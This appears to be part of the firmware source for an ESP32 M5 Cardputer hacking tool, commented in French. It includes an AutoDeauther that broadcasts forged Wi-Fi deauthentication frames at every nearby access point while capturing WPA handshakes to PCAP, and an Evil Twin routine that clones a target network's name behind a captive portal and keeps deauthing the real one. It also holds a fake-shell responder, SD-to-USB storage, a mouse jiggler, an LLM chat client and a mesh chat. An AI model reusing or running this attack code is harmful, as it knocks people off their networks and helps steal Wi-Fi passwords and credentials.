        client.println("[    0.000000] Booting Linux on physical CPU 0");
        client.println("[    0.123456] Linux version 5.4.0-109-generic (buildd@lgw01-amd64-039) (gcc version 9.3.0, GNU ld version 2.34) #123-Ubuntu SMP");
      }
      else if (command.equals("last")) {
        client.println("pi     pts/0        192.168.1.10    Wed Feb  3 12:00   still logged in");
        client.println("reboot system boot  5.4.0-109-generic Wed Feb  3 11:55   still running");
      }
      else if (command.equals("finger pi")) {
        client.println("Login: pi");
        client.println("Name:  ");
        client.println("Directory: /home/pi");
        client.println("Shell: /bin/bash");
      }
      //------------------------------------------------
      // 10. Commande vide (juste EntrÃ©e)
      //------------------------------------------------
      else if (command.length() == 0) {
        // Ne rien faire
      }
  
      //------------------------------------------------
      // 11. Commande non reconnue
      //------------------------------------------------
      else {
        client.println("bash: " + command + ": command not found");
      }
    }
  
    // DÃ©connexion
    client.stop();
    Serial.println(F("Client disconnected."));
}


// -- Helper function to read a line from the client --
String readLine(WiFiClient &client, bool echo) {
    String line = "";
    while (client.connected()) {
        if (client.available()) {
            char c = client.read();
            if (c == '\r') {
                continue; // Ignore CR
            }
            if (c == '\n') {
                break; // Fin de ligne
            }
            // Ajouter le caractÃ¨re Ã  la ligne sans jamais Ã©cho
            line += c;
        }
    }

    // Pas de gestion d'Ã©cho ici (pas de client.print)
    return line;
}




/*
============================================================================================================================
// SD to USB
============================================================================================================================
*/


#include <USBMSC.h>
#include "tusb.h" 

// Objet USB MSC
USBMSC usbMassStorage;

// Instance SPI
SPIClass spiInterface;

// Broches de la carte SD
constexpr int sdChipSelectPin = 12;
constexpr int sdDataInPin   = 39;
constexpr int sdDataOutPin  = 14;
constexpr int sdClockPin    = 40;

// Fonctions de lecture/Ã©criture pour le stockage USB MSC
int32_t handleUsbWrite(uint32_t logicalBlockAddr, uint32_t dataOffset, uint8_t* dataBuffer, uint32_t bufferSize) {
  uint64_t availableSpace = SD.totalBytes() - SD.usedBytes();
  if (bufferSize > availableSpace) {
    return -1;
  }
  const uint32_t sectorSize = SD.sectorSize();
  if (sectorSize == 0) {
    return -1;
  }
  for (uint32_t blockIndex = 0; blockIndex < bufferSize / sectorSize; ++blockIndex) {
    uint8_t blockBuffer[512]; // Allocation statique
    memcpy(blockBuffer, dataBuffer + sectorSize * blockIndex, sectorSize);
    if (!SD.writeRAW(blockBuffer, logicalBlockAddr + blockIndex)) {
      return -1;
    }
  }
  return bufferSize;
}

int32_t handleUsbRead(uint32_t logicalBlockAddr, uint32_t dataOffset, void* dataBuffer, uint32_t bufferSize) {
  const uint32_t sectorSize = SD.sectorSize();
  if (sectorSize == 0) {
    return -1;
  }
  for (uint32_t blockIndex = 0; blockIndex < bufferSize / sectorSize; ++blockIndex) {
    if (!SD.readRAW(reinterpret_cast<uint8_t*>(dataBuffer) + (blockIndex * sectorSize), logicalBlockAddr + blockIndex)) {
      return -1;
    }
  }
  return bufferSize;
}

bool manageUsbPower(uint8_t powerState, bool start, bool loadEject) {
  return true;
}

// Initialisation des callbacks et configuration du mÃ©dia pour l'USB MSC
void initializeUsbCallbacks() {
  uint32_t sectorSize = SD.sectorSize();
  uint32_t totalSectors = SD.numSectors();

  // VÃ©rifier que la carte SD est bien montÃ©e
  if (totalSectors == 0 || sectorSize == 0) {
    return;
  }

  usbMassStorage.vendorID("ESP32");
  usbMassStorage.productID("USB_MSC");
  usbMassStorage.productRevision("1.0");
  usbMassStorage.onRead(handleUsbRead);
  usbMassStorage.onWrite(handleUsbWrite);
  usbMassStorage.onStartStop(manageUsbPower);
  usbMassStorage.mediaPresent(true);  // On indique que le mÃ©dia est prÃ©sent
  usbMassStorage.begin(totalSectors, sectorSize);
}

// Fonction principale qui passe du SD Ã  l'USB
void sdToUsb() {
  // ArrÃªter l'accÃ¨s Ã  la carte SD
  SD.end();
  delay(100);

  // DÃ©marrer l'interface SPI pour la carte SD
  spiInterface.begin(sdClockPin, sdDataInPin, sdDataOutPin, sdChipSelectPin);

  // Attente stricte du montage du mÃ©dia SD
  while (!SD.begin(sdChipSelectPin, spiInterface, 40000000UL)) {
    delay(1000);
  }

  // Initialisation des callbacks USB et configuration du stockage
  initializeUsbCallbacks();

  // DÃ©marrage de la connexion USB
  USB.begin();

  // Affichage sur l'Ã©cran
  M5.Display.fillScreen(TFT_BLACK);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(5, 5);
  M5.Display.println("Mounting SDCard on USB, please wait...");

  // Attente active jusqu'Ã  ce que l'USB soit montÃ© et stable
  // On attend que tud_mounted() retourne true de maniÃ¨re continue pendant 1 seconde
  uint32_t stableTime = millis();
  while (true) {
    if (tud_mounted()) {
      if (millis() - stableTime > 45000) {  // 5 secondes de stabilitÃ©
        break;
      }
    } else {
      // Si tud_mounted() retourne false, on rÃ©initialise le compteur
      stableTime = millis();
    }
    M5Cardputer.update();
    delay(10);
  }

  waitAndReturnToMenu("SD mounted on USB");
}







/*
============================================================================================================================
//AutoDeauth
============================================================================================================================
*/
int nombreDeEAPOLAuto = 0;
#define mac_history_len 512

struct mac_addr {
  unsigned char bytes[6];
};
static std::vector<mac_addr> mac_history;
unsigned int mac_history_cursor = 0;

void save_mac(unsigned char* mac) {
  if (mac_history.empty()) {
    mac_history.assign(mac_history_len, mac_addr{});
  }
  if (mac_history_cursor >= mac_history_len) {
    mac_history_cursor = 0;
  }
  struct mac_addr tmp;
  memcpy(tmp.bytes, mac, 6);
  mac_history[mac_history_cursor] = tmp;
  mac_history_cursor++;
}

boolean seen_mac(unsigned char* mac) {
  struct mac_addr tmp;
  memcpy(tmp.bytes, mac, 6);
  if (mac_history.empty()) return false;
  for (int x = 0; x < mac_history_len; x++) {
    if (mac_cmp(tmp, mac_history[x])) {
      return true;
    }
  }
  return false;
}

boolean mac_cmp(struct mac_addr addr1, struct mac_addr addr2) {
  for (int y = 0; y < 6; y++) {
    if (addr1.bytes[y] != addr2.bytes[y]) {
      return false;
    }
  }
  return true;
}

void clear_mac_history() {
  // RÃ©initialiser l'historique des MACs
  mac_history_cursor = 0;
  if (mac_history.empty()) {
    mac_history.assign(mac_history_len, mac_addr{});
  } else {
    for (size_t i = 0; i < mac_history.size(); ++i) memset(mac_history[i].bytes, 0, 6);
  }
  Serial.println(F("MAC history cleared."));
}

void sendDeauthPacketAuto(uint8_t *apMac, uint8_t channel) {
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, // Type/Subtype: Deauthentication (0xC0)
    0x3A, 0x01, // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: AP MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: AP MAC
    0x00, 0x00, // Fragment number and sequence number
    0x07, 0x00  // Reason code: Class 3 frame received from nonassociated STA
  };

  memcpy(&deauthPacket[10], apMac, 6);  // AP MAC address
  memcpy(&deauthPacket[16], apMac, 6);  // BSSID (AP MAC)

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE); // Changer de canal
  for (int i = 0; i < 10; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false); // Envoyer le paquet
    delay(1);
  }

  Serial.println(F("Deauth packets sent"));
  Serial.println(F("==============================="));
}

String security_int_to_string(int security_type) {
  // Convertit le type de sÃ©curitÃ© en chaÃ®ne lisible
  switch (security_type) {
    case WIFI_AUTH_OPEN:
      return "OPEN";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA/WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "WPA2_ENTERPRISE";
    case WIFI_AUTH_WPA3_PSK:
      return "WPA3_PSK";
    default:
      return "UNKNOWN";
  }
}

bool isBeacon(const wifi_promiscuous_pkt_t* packet) {
  const uint8_t *payload = packet->payload;
  uint16_t len = packet->rx_ctrl.sig_len;

  if (len < 24) { 
    return false;
  }

  uint16_t frameControl = ((uint16_t)payload[1] << 8) | payload[0];
  uint8_t frameType = (frameControl & 0x000C) >> 2;
  uint8_t frameSubType = (frameControl & 0x00F0) >> 4;

  if (frameType == 0 && frameSubType == 8) {
    return true;
  }

  return false;
}

void captureAssociatedBeacon(uint8_t *bssidTarget) {
  // On garde le canal courant
  uint8_t originalChannelAuto;
  esp_wifi_get_channel(&originalChannelAuto, nullptr);

  // On Ã©coute sur tous les canaux rapidement
  for (int ch = 1; ch <= 13; ch++) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    delay(100);  // petite pause pour laisser le temps aux beacons de passer

    int n = WiFi.scanNetworks(false, true, false, 1000, ch);
    for (int i = 0; i < n; i++) {
      uint8_t *foundBssid = WiFi.BSSID(i);
      if (foundBssid && memcmp(foundBssid, bssidTarget, 6) == 0) {
        String ssid = WiFi.SSID(i);
        String bssidStr = WiFi.BSSIDstr(i);
        int32_t rssi = WiFi.RSSI(i);
        String security = security_int_to_string(WiFi.encryptionType(i));
        int32_t chFound = WiFi.channel(i);

        Serial.println(F("Beacon associÃ© trouvÃ© !"));
        displayAPInfo(ssid, bssidStr, security, rssi, chFound);
        return;
      }
    }
  }

  esp_wifi_set_channel(originalChannelAuto, WIFI_SECOND_CHAN_NONE); // retour au canal initial
  Serial.println(F("Beacon associÃ©e introuvable."));
}

void displayAPInfo(String ssid, String bssid, String security, int32_t rssi, int32_t channel) {
  M5.Lcd.clear();
  M5.Lcd.setCursor(0, 10);
  M5.Lcd.setTextSize(1.5);

  M5.Lcd.println("== AP Information ==");
  M5.Lcd.printf("Channel: %d\n", channel);
  M5.Lcd.printf("SSID:%s\n", ssid.c_str());
  M5.Lcd.printf("MAC:%s\n", bssid.c_str());
  M5.Lcd.printf("Security:%s\n", security.c_str());
  M5.Lcd.printf("RSSI: %d dBm\n", rssi);
  M5.Lcd.printf("EAPOL: %d", nombreDeEAPOLAuto);
}

void extractBSSID(const uint8_t* payload, uint16_t frameControl, uint8_t* bssid) {
  uint8_t frameType = (frameControl & 0x000C) >> 2;
  uint8_t toDS = (frameControl & 0x0100) >> 8;
  uint8_t fromDS = (frameControl & 0x0200) >> 9;

  if (frameType == 0) {
    memcpy(bssid, &payload[16], 6); // Management frame
  } else if (frameType == 2) {
    if (toDS == 0 && fromDS == 0) {
      memcpy(bssid, &payload[16], 6);
    } else if (toDS == 1 && fromDS == 0) {
      memcpy(bssid, &payload[4], 6);
    } else if (toDS == 0 && fromDS == 1) {
      memcpy(bssid, &payload[10], 6);
    } else {
      memset(bssid, 0, 6);
    }
  } else {
    memset(bssid, 0, 6);
  }
}


uint8_t lastEAPOLBSSID[6];
bool eapolDetected = false;

void eapolSnifferAutoCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  const uint8_t *payload = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;

  // Extraction du Frame Control
  uint16_t frameCtrl = ((uint16_t)payload[1] << 8) | payload[0];
  uint8_t bssid[6];
  extractBSSID(payload, frameCtrl, bssid);

  // === EAPOL ===
  if (estUnPaquetEAPOL(pkt)) {
    Serial.println(F("EAPOL Detected!"));

    enregistrerDansFichierPCAP(pkt, false); 
    nombreDeEAPOLAuto++;

    memcpy(lastEAPOLBSSID, bssid, 6);  // on retient le BSSID
    eapolDetected = true;

    if (!seen_mac(bssid)) {
      captureAssociatedBeacon(bssid); // Info visuelle
      save_mac(bssid);
    }
  }

  // === Beacon ===
  else if (eapolDetected && isBeacon(pkt)) {
    if (memcmp(lastEAPOLBSSID, bssid, 6) == 0) {
      Serial.println(F("Beacon associÃ©e dÃ©tectÃ©e !"));
      pkt->rx_ctrl.sig_len -= 4;  // RÃ©duire la longueur du signal de 4 bytes
      enregistrerDansFichierPCAP(pkt, false); 
      eapolDetected = false; // Ã©vite de prendre plusieurs fois
    }
  }
}



void autoDeauther() {
  unsigned long lastTime = 0;
  unsigned long timerDelay = 200;
  unsigned long clearMacHistoryTime = 0;
  const unsigned long macHistoryInterval = 15000;
  int channel = 1;
  const int maxChannel = 13;

  char bufBSSID[64];
  char Buf[50];

  M5Cardputer.Display.fillScreen(TFT_BLACK);
  M5Cardputer.Display.setCursor(0, 0);
  M5Cardputer.Display.setTextSize(1.5);

  // Load whitelist from config so KarmaAutoWhitelist applies to AutoDeauther
  // Uses the same config key: KarmaAutoWhitelist=SSID1,SSID2,pa*tern
  readConfigFile("/evil/config/config.txt");
  seenWhitelistedSSIDs.clear();

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(eapolSnifferAutoCallback);
  
  while (true) {
    M5.update();
    M5Cardputer.update();

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      break;
    }

    if ((millis() - clearMacHistoryTime) > macHistoryInterval) {
      clear_mac_history();
      clearMacHistoryTime = millis();
    }

    if ((millis() - lastTime) > timerDelay) {
      esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
      int n = WiFi.scanNetworks(false, true, false, 1000, channel);

      if (n == 0) {
        Serial.println(F("No networks found"));
      } else {
        for (int i = 0; i < n; i++) {
          uint8_t* bssidPtr = WiFi.BSSID(i);
          if (bssidPtr == NULL) {
            Serial.println(F("Invalid BSSID pointer, skipping..."));
            continue;
          }
        
          if (seen_mac(bssidPtr)) {
            Serial.println("Already sent to: " + WiFi.BSSIDstr(i));
            continue;
          }
        
          // Sauvegarde sÃ©curisÃ©e des donnÃ©es
          String MacString = WiFi.BSSIDstr(i);
          strncpy(bufBSSID, MacString.c_str(), sizeof(bufBSSID) - 1);
          bufBSSID[sizeof(bufBSSID) - 1] = '\0';
          strcpy(myData.bssid, bufBSSID);
        
          String AP = WiFi.SSID(i);
          strncpy(Buf, AP.c_str(), sizeof(Buf) - 1);
          Buf[sizeof(Buf) - 1] = '\0';
          strcpy(myData.ssid, Buf);

          // Skip deauth if SSID matches KarmaAutoWhitelist
          if (isSSIDWhitelisted(AP.c_str())) {
            if (seenWhitelistedSSIDs.find(AP.c_str()) == seenWhitelistedSSIDs.end()) {
              seenWhitelistedSSIDs.insert(AP.c_str());
              Serial.println("SSID in whitelist, ignoring: " + AP);
            }
            continue;
          }
        
          String securityType = security_int_to_string(WiFi.encryptionType(i));
          int32_t rssi = WiFi.RSSI(i);
          int32_t apChannel = WiFi.channel(i);
        
          // Affichage sÃ©rie
          Serial.println(F("=== Access Point Information ==="));
          Serial.printf("SSID: %s\n", AP.c_str());
          Serial.printf("BSSID: %s\n", MacString.c_str());
          Serial.printf("Security: %s\n", securityType.c_str());
          Serial.printf("RSSI: %d dBm\n", rssi);
          Serial.printf("Channel: %d\n", apChannel);
          Serial.println(F("==============================="));

          displayAPInfo(AP, MacString, securityType, rssi, apChannel);
  
          // Actions
          save_mac(bssidPtr);
          for (int i = 0; i < 5; i++) {
            sendDeauthPacketAuto(bssidPtr, apChannel);          
          }
         delay(50);
        }
        unsigned long listenStart = millis();
        while (millis() - listenStart < 2000) {
          delay(1);
        }
      }

      lastTime = millis();

      // Changement de canal
      channel++;
      if (channel > maxChannel) channel = 1;

      M5.Lcd.clear();
      M5.Lcd.setCursor(10, 10);
      M5.Lcd.printf("Current Channel: %d", channel);
      M5.Lcd.println(" ");
      M5.Lcd.println(" ");
      M5.Lcd.println(" ");
      M5.Lcd.println(" ");
      M5.Lcd.println(" ");
      M5.Lcd.println(" ");
      M5.Lcd.printf("EAPOL: %d", nombreDeEAPOLAuto);
    }
    delay(10);  // petite pause CPU
  }
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);

  waitAndReturnToMenu("Stopping AutoDeauth");  // retour au menu principal
}


/*
============================================================================================================================
//mouse-jiggler
============================================================================================================================
*/
USBHIDMouse Mouse;
unsigned long delayBetweenMoves = 2000;
unsigned long lastMoveTime = 0;
int moveAmount = 30;

void runMouseJiggler() {
  USB.begin();  
  Mouse.begin();

  M5.Display.clear();
  M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
  M5.Display.setTextSize(1.5);
  M5.Display.setCursor(70, 50);
  M5.Display.println("Jiggling...");

  // Affichage du dÃ©lai et du mouvement
  auto displayInfo = []() {
    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    M5.Display.fillRect(0, 0, M5.Display.width(), 24, BLACK);  // AjustÃ© pour deux lignes
    M5.Display.setCursor(50, 0);
    M5.Display.printf("< Delay:%lums >     ", delayBetweenMoves);
    M5.Display.setCursor(50, 20);
    M5.Display.printf("^  Move:%dpx  v    ", moveAmount);  };

  // Animation lapin
  auto drawBunny = [](int frame) {
    M5.Display.fillRect(0, 100, M5.Display.width(), 48, BLACK);
    if (frame == 1) {
      M5.Display.setCursor(40, 100);
      M5.Display.println("()-() (\\__/)");
      M5.Display.setCursor(30, 112);
      M5.Display.println("  \\\"/  (o.o )");
      M5.Display.setCursor(30, 124);
      M5.Display.println("   `   <   <");
    } else {
      M5.Display.setCursor(80, 100);
      M5.Display.println(" (\\__/) ()-()");
      M5.Display.setCursor(70, 112);
      M5.Display.println("  ( o.o)  \\\"/");
      M5.Display.setCursor(70, 124);
      M5.Display.println("   >   >   ` ");
    }
  };

  displayInfo();
  bool stop = false;
  int bunnyFrame = 0;
  int moveDirection = 1;

  while (!stop) {
    M5Cardputer.update();

    // Stop
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      stop = true;
      break;
    }

    // RÃ©duction du dÃ©lai
    if (M5Cardputer.Keyboard.isKeyPressed(',')) {
      delayBetweenMoves = (delayBetweenMoves >= 500) ? delayBetweenMoves - 500 : 0;
      displayInfo();
      delay(200);
    }

    // Augmentation du dÃ©lai
    if (M5Cardputer.Keyboard.isKeyPressed('/')) {
      delayBetweenMoves = min(300000UL, delayBetweenMoves + 500);
      displayInfo();
      delay(200);
    }

    // Augmentation du mouvement
    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
      moveAmount = min(100, moveAmount + 1);
      displayInfo();
      delay(150);
    }

    // RÃ©duction du mouvement
    if (M5Cardputer.Keyboard.isKeyPressed('.')) {
      moveAmount = max(3, moveAmount - 1);
      displayInfo();
      delay(150);
    }

    // Mouvement automatique
    if (millis() - lastMoveTime >= delayBetweenMoves) {
      drawBunny(bunnyFrame);
      Mouse.move(moveAmount * moveDirection, 0);
      delay(100);
      lastMoveTime = millis();

      bunnyFrame = 1 - bunnyFrame;
      moveDirection *= -1;
    }

    delay(10);
  }

  Mouse.end();
  waitAndReturnToMenu("Stopping MouseJiggler");
}

/*
============================================================================================================================
// Switch DNS
============================================================================================================================
*/

void startEvilTwin(int index) {
    if (index < 0 || index >= numSsid) {
        Serial.println(F("Index invalide pour Evil Twin"));
        return;
    }

    String targetSSID = ssidList[index];
    int targetChannel = WiFi.channel(index);
    uint8_t* targetBSSID = WiFi.BSSID(index);

    // Mise Ã  jour de l'AP clonÃ©
    clonedSSID = targetSSID;
    createCaptivePortal(); // Faux AP lancÃ©
    WiFi.mode(WIFI_MODE_APSTA);
    
    M5.Display.clear();
    M5.Display.setTextSize(1.5);
    M5.Display.setCursor(5, 10);
    M5.Display.println("== Evil Twin Mode ==");
    M5.Display.println("SSID : " + targetSSID);
    M5.Display.println("Channel : " + String(targetChannel));

    int packetCount = 0;
    unsigned long lastUpdate = 0;

    while (true) {
        M5Cardputer.update();
        handleDnsRequestSerial();
        // Check si RETURN est pressÃ©
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) break;

        // RafraÃ®chissement Ã©cran toutes les 200ms
        if (millis() - lastUpdate > 100) {
            // Envoie des paquets de deauth
            sendDeauthPacketAuto(targetBSSID, targetChannel);
            packetCount ++;
            int clients = getConnectedPeopleCount();

            M5.Display.fillRect(0, 60, 240, 40, menuBackgroundColor);
            M5.Display.setCursor(5, 60);
            M5.Display.printf("Deauth : %d\n", packetCount);
            M5.Display.printf("Client : %d\n", clients);

            lastUpdate = millis();
        }
        delay(1); // Ã©vite surchauffe CPU
    }

    stopCaptivePortal();
    waitAndReturnToMenu("Evil Twin Stopped");
}







String encodeBase64(const String& input) {
  const char* base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  String output = "";
  int i = 0;
  uint8_t array3[3];
  uint8_t array4[4];

  int inputLen = input.length();
  int index = 0;

  while (inputLen--) {
    array3[i++] = input[index++];
    if (i == 3) {
      array4[0] = (array3[0] & 0xfc) >> 2;
      array4[1] = ((array3[0] & 0x03) << 4) + ((array3[1] & 0xf0) >> 4);
      array4[2] = ((array3[1] & 0x0f) << 2) + ((array3[2] & 0xc0) >> 6);
      array4[3] = array3[2] & 0x3f;

      for (i = 0; i < 4; i++)
        output += base64_chars[array4[i]];
      i = 0;
    }
  }

  if (i) {
    for (int j = i; j < 3; j++)
      array3[j] = '\0';

    array4[0] = (array3[0] & 0xfc) >> 2;
    array4[1] = ((array3[0] & 0x03) << 4) + ((array3[1] & 0xf0) >> 4);
    array4[2] = ((array3[1] & 0x0f) << 2) + ((array3[2] & 0xc0) >> 6);
    array4[3] = array3[2] & 0x3f;

    for (int j = 0; j < i + 1; j++)
      output += base64_chars[array4[j]];

    while ((i++ < 3))
      output += '=';
  }

  return output;
}

void evilLLMChatStream() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    Serial.println(F("[INFO] Not connected to a network."));
    waitAndReturnToMenu("Not connected to a network.");
    return;
  }

  inMenu = false;

  const int charWidth = 8;
  const int lineHeight = 13;
  const int screenWidth = 208;
  const int linesPerPage = 9;

  M5.Display.clear();
  M5.Display.setCursor(5, 5);
  M5.Display.println("Prompt >");

  while (true) {
    String userPrompt = getUserInput("Prompt > ");
    if (userPrompt.length() == 0) continue;

    WiFiClientSecure client;
    client.setInsecure();
    client.setTimeout(10000);

    if (!client.connect(llmHost.c_str(), llmhttpsPort)) {
      waitAndReturnToMenu("Connection failed.");
      return;
    }

    String requestBody =
      "{\"model\":\"" + llmModel +
      "\",\"prompt\":\"" + userPrompt +
      "\",\"stream\":true,\"options\":{\"num_predict\":" + String(llmMaxTokens) + "}}";

    String authRaw = llmUser + ":" + llmPass;
    String authB64 = encodeBase64(authRaw);

    String request =
      "POST " + llmapiPath + " HTTP/1.1\r\n" +
      "Host: " + llmHost + "\r\n" +
      "Authorization: Basic " + authB64 + "\r\n" +
      "Content-Type: application/json\r\n" +
      "Content-Length: " + String(requestBody.length()) + "\r\n" +
      "Connection: close\r\n\r\n" +
      requestBody;

    M5.Display.clear();
    M5.Display.setCursor(5, 5);
    M5.Display.println("Send.");
    M5.Display.println("Waiting answer...");

    client.print(request);

    while (client.connected() && !M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      String line = client.readStringUntil('\n');
      if (line == "\r") break;
    }

    std::vector<String> lines;
    String currentLine = "";
    int scrollOffset = 0;
    bool gotFirstToken = false;
    unsigned long streamStart = millis();

    M5.Display.clear();

    while (client.connected()) {
      M5.update();
      M5Cardputer.update();

      // Interruption utilisateur
      if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        client.stop();
        waitAndReturnToMenu("Stream interrupted by user");
        return;
      }

      // Timeout si aucun token received
      if (!gotFirstToken && millis() - streamStart > 10000) {
        client.stop();
        waitAndReturnToMenu("LLM not responding (timeout)");
        return;
      }

      // Scroll 
      if (M5Cardputer.Keyboard.isKeyPressed(';') && scrollOffset > 0) {
        scrollOffset--;
        M5.Display.clear();
        for (int i = 0; i < linesPerPage; i++) {
          int idx = scrollOffset + i;
          if (idx < lines.size()) {
            M5.Display.setCursor(5, 10 + i * lineHeight);
            M5.Display.println(lines[idx]);
          }
        }
        delay(150);
        continue;
      } else if (M5Cardputer.Keyboard.isKeyPressed('.') && scrollOffset < lines.size()) {
        scrollOffset++;
        M5.Display.clear();
        for (int i = 0; i < linesPerPage; i++) {
          int idx = scrollOffset + i;
          if (idx < lines.size()) {
            M5.Display.setCursor(5, 10 + i * lineHeight);
            M5.Display.println(lines[idx]);
          }
        }
        delay(150);
        continue;
      }

      String line = client.readStringUntil('\n');
      line.trim();
      if (line.length() == 0) continue;

      StaticJsonDocument<512> doc;
      DeserializationError err = deserializeJson(doc, line);
      if (err) continue;
      if (doc["done"] == true) break;

      if (doc.containsKey("response")) {
        gotFirstToken = true;
        String token = doc["response"].as<String>();
        token.replace("\\n", "\n");

        String word = "";
        for (int i = 0; i <= token.length(); i++) {
          char c = token[i];
          bool isEnd = (i == token.length());
          bool isSpace = (c == ' ' || c == '\n' || isEnd);

          if (!isEnd && !isSpace) {
            word += c;
            continue;
          }

          int wordPixelLength = word.length() * charWidth;
          int linePixelLength = currentLine.length() * charWidth;

          if (linePixelLength + wordPixelLength > screenWidth) {
            lines.push_back(currentLine);
            currentLine = "";
            linePixelLength = 0;
          }

          if (wordPixelLength > screenWidth) {
            for (int j = 0; j < word.length(); j++) {
              currentLine += word[j];
              if ((currentLine.length() * charWidth) >= screenWidth) {
                lines.push_back(currentLine);
                currentLine = "";
              }
            }
          } else {
            currentLine += word;
          }

          if (!isEnd && c != '\n') currentLine += c;
          if (c == '\n') {
            lines.push_back(currentLine);
            currentLine = "";
          }

          word = "";
        }

        if ((lines.size() - scrollOffset) < linesPerPage) {
          M5.Display.clear();
          for (int i = 0; i < linesPerPage; i++) {
            int idx = scrollOffset + i;
            if (idx < lines.size()) {
              M5.Display.setCursor(5, 10 + i * lineHeight);
              M5.Display.println(lines[idx]);
            }
          }

          if (currentLine.length() > 0) {
            M5.Display.setCursor(5, 10 + (lines.size() - scrollOffset) * lineHeight);
            M5.Display.println(currentLine);
          }
        }
      }
    }

    if (currentLine.length() > 0) lines.push_back(currentLine);
    lines.push_back("______");

    while (true) {
      M5.update();
      M5Cardputer.update();

      if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        waitAndReturnToMenu("evilChatStream Stopped");
        return;
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        M5.Display.clear();
        M5.Display.setCursor(5, 5);
        M5.Display.println("Prompt >");
        break;
      } else if (M5Cardputer.Keyboard.isKeyPressed(';') && scrollOffset > 0) {
        scrollOffset--;
        M5.Display.clear();
      } else if (M5Cardputer.Keyboard.isKeyPressed('.') && scrollOffset < lines.size()) {
        scrollOffset++;
        M5.Display.clear();
      }

      for (int i = 0; i < linesPerPage; i++) {
        int idx = scrollOffset + i;
        if (idx < lines.size()) {
          M5.Display.setCursor(5, 10 + i * lineHeight);
          M5.Display.println(lines[idx]);
        }
      }

      delay(100);
    }
  }
}




/*
============================================================================================================================
EvilChatMesh
============================================================================================================================
*/


#define MAX_MSG_LEN 100
#define MAX_HISTORY 32
#define MAX_NODES   30


struct NodePresence {
    char nick[16];
    unsigned long lastSeen;
};

struct MeshMessage {
    char id[9];
    char from[16];
    char body[MAX_MSG_LEN];
};

struct Message {
    char content[MAX_MSG_LEN];
};

/* ---------- VARIABLES GLOBALES ---------- */
static std::vector<NodePresence> nodesConnected;
int          nodesCount        = 0;

static std::vector<std::array<char,9>> seenMessageIds;
int  seenIndex         = 0;

char inputBuffer[MAX_MSG_LEN]  = "";

uint8_t broadcastAddressEspNow[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

static std::vector<Message> messages;
int     messageCount   = 0;
int     messageHead    = 0;

/* Timings */
#define TIMEOUT_PRESENCE 2000
#define PING_INTERVAL     500
unsigned long lastPing  = 0;

/* ---------- BUFFER SÃ‰CURISÃ‰ POUR LE CALLBACK ---------- */
volatile bool    newPacketPending = false;
volatile uint8_t packetBuffer[sizeof(MeshMessage)+sizeof(uint16_t)];
volatile int     packetLen        = 0;

/* ---------- PROTOTYPES (dÃ©clarÃ©s ici pour la loop) ---------- */
void handleIncomingPacket(const uint8_t* data, int len);
void drawChatWindow();
void broadcastPing();
void updatePresence(const char* nick);

/* ---------- CALLBACK ESPâ€‘NOW ULTRAâ€‘COURT ---------- */
void IRAM_ATTR OnDataRecvChat(const uint8_t* mac,
                              const uint8_t* incomingData, int len)
{
    if (len > sizeof(packetBuffer)) return;        // paquet trop gros
    memcpy((void*)packetBuffer, incomingData, len);
    packetLen        = len;
    newPacketPending = true;                      // flag pour la loop()
}

// ----- Hash pour dÃ©â€‘duplication -----
void simpleHash(const char* s, char* outHash) {
    uint32_t h = 5381;
    while (*s) h = ((h << 5) + h) + (uint8_t)(*s++);
    snprintf(outHash, 9, "%08X", h);   // 8â€¯hex, zÃ©roâ€‘terminÃ©
}

// ----- CRC16 (CRCâ€‘CCITT) -----
uint16_t crc16(const uint8_t* data, size_t len) {
    uint16_t crc = 0xFFFF;
    for (size_t i = 0; i < len; ++i) {
        crc ^= (uint16_t)data[i] << 8;
        for (int j = 0; j < 8; ++j)
            crc = (crc & 0x8000) ? (crc << 1) ^ 0x1021 : (crc << 1);
    }
    return crc;
}

// ----- Historique dâ€™ID reÃ§us -----
bool hasSeenId(const char* id) {
    if ((int)seenMessageIds.size() < MAX_HISTORY) return false;
    for (int i = 0; i < MAX_HISTORY; ++i)
        if (strncmp(seenMessageIds[i].data(), id, 8) == 0) return true;
    return false;
}
void rememberId(const char* id) {
    if ((int)seenMessageIds.size() < MAX_HISTORY) seenMessageIds.resize(MAX_HISTORY);
    strncpy(seenMessageIds[seenIndex].data(), id, 8);
    seenMessageIds[seenIndex].data()[8] = '\0';
    seenIndex = (seenIndex + 1) % MAX_HISTORY;
}

// ----- Buffer circulaire de messages pour lâ€™Ã©cran -----
void addMessage(const char* m) {
